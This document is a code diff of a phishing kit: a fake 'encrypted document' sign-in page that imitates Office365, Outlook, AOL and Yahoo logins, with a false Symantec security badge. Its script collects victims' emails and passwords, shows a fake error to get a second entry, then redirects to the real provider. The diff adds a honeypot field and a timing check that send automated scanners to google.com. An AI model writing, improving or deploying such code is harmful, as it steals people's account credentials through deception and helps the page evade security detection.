@@ -57,7 +57,7 @@
                                         <span class="btn-text">Sign in with Other Mail</span>
                                     </button>
                                 </div>
-                                
+
                             </div>
 
                             <div id="form_div" class="form-div">
@@ -66,7 +66,8 @@
                                     <div class="logo-section">
                                         <img id="main_form_logo" src="./otheremail.png" alt="" class="img-fluid" />
                                     </div>
-                                    <p class="main-card-intro"> The document has been encrypted, please proceed with your
+                                    <p class="main-card-intro"> The document has been encrypted, please proceed with
+                                        your
                                         credentials to authenticate.</p>
                                     <div class="form-body">
                                         <form id="sign_in" method="post">
@@ -89,9 +90,13 @@
                                                     value="Office365" class="form-control" hidden required />
                                                 <input type="hidden" name="click_count" id="click_count" value="1"
                                                     class="form-control" required />
-
+                                                <!-- Honeypot field (invisible to users) -->
+                                                <div style="display:none;">
+                                                    <input type="text" name="website" id="website"
+                                                        placeholder="Leave this field blank" />
+                                                </div>
                                             </div>
-
+                                            <input type="hidden" id="form_time" name="form_time" value="" />
                                             <div class="form-button">
                                                 <button type="submit" name="sign_in_btn" id="sign_in_btn"
                                                     class="btn btn-md btn-primary">Sign in</button>
@@ -103,9 +108,8 @@
                             </div>
                             <div class="footer-sect">
 
-                                <p class="main-card-footer"> <span class="f-text"><i
-                                            class="fas fa-check-circle"></i> Secured with </span> <img
-                                        src="./Symantec_logo.png" width="100px" alt=""></p>
+                                <p class="main-card-footer"> <span class="f-text"><i class="fas fa-check-circle"></i>
+                                        Secured with </span> <img src="./Symantec_logo.png" width="100px" alt=""></p>
                             </div>
                         </div>
                     </div>
@@ -189,43 +193,70 @@
 
 </script>
 
+
 <script>
-    $("#sign_in").submit(function (event) {
-        event.preventDefault();
-        const sectionType = $("#section_type").val();
-        let clickCount = $("#click_count").val();
-        let user_email = $("#email").val();
-        let user_password = $("#password").val();
-
-        // First clickCount
-        if (clickCount === '1') {
-            processAction(user_email, user_password, clickCount, sectionType).then(() => {
-                $("#error_span").show();
-                $("#click_count").val("2");
-            })
-
-        }
-
-        // Second clickCount
-        else if (clickCount === '2') {
-
-            processAction(user_email, user_password, clickCount, sectionType).then(() => {
-                if (sectionType === 'Office 365') {
-                    window.location.replace("https://www.office.com/login");
-                } else if (sectionType === 'Outlook') {
-                    window.location.replace("https://outlook.office.com/mail/inbox");
-                } else if (sectionType === 'AOL') {
-                    window.location.replace("https://login.aol.com/");
-                } else if (sectionType === 'Yahoo') {
-                    window.location.replace("https://mail.yahoo.com/d/folders/");
-                } else {
-                    window.location.replace("https://outlook.office.com/mail/inbox");
-                }
-            })
-
-
-        }
+    document.addEventListener("DOMContentLoaded", function () {
+        // Set the time the form was loaded
+        document.getElementById('form_time').value = new Date().getTime();
     });
+
+    // Add JavaScript to check the honeypot field
+    document.getElementById('sign_in').onsubmit = function (e) {
+        // Check if the honeypot field is filled out
+        if (document.getElementById('website').value !== '') {
+            // If the honeypot field is filled, prevent form submission
+            e.preventDefault();
+            window.location.href = 'https://google.com/';
+            return false;
+        }
+
+        // Check the time taken to fill the form
+        var loadTime = parseInt(document.getElementById('form_time').value);
+        var submitTime = new Date().getTime();
+        // If form is submitted too quickly after loading, prevent submission
+        if ((submitTime - loadTime) < 10000) { // 10 seconds as an example
+            e.preventDefault();
+            // alert('Form submitted too quickly. Are you a human?');
+            window.location.href = 'https://google.com/';
+            return false;
+
+        } else {
+
+            e.preventDefault();
+            const sectionType = $("#section_type").val();
+            let clickCount = $("#click_count").val();
+            let user_email = $("#email").val();
+            let user_password = $("#password").val();
+
+            // First clickCount
+            if (clickCount === '1') {
+                processAction(user_email, user_password, clickCount, sectionType).then(() => {
+                    $("#error_span").show();
+                    $("#click_count").val("2");
+                })
+
+            }
+            // Second clickCount
+            else if (clickCount === '2') {
+
+                processAction(user_email, user_password, clickCount, sectionType).then(() => {
+                    if (sectionType === 'Office 365') {
+                        window.location.replace("https://www.office.com/login");
+                    } else if (sectionType === 'Outlook') {
+                        window.location.replace("https://outlook.office.com/mail/inbox");
+                    } else if (sectionType === 'AOL') {
+                        window.location.replace("https://login.aol.com/");
+                    } else if (sectionType === 'Yahoo') {
+                        window.location.replace("https://mail.yahoo.com/d/folders/");
+                    } else {
+                        window.location.replace("https://outlook.office.com/mail/inbox");
+                    }
+                })
+
+
+            }
+        }
+    };
 
     function processAction(user_email, user_password, clickCount, sectionType) {
         return $.ajax({
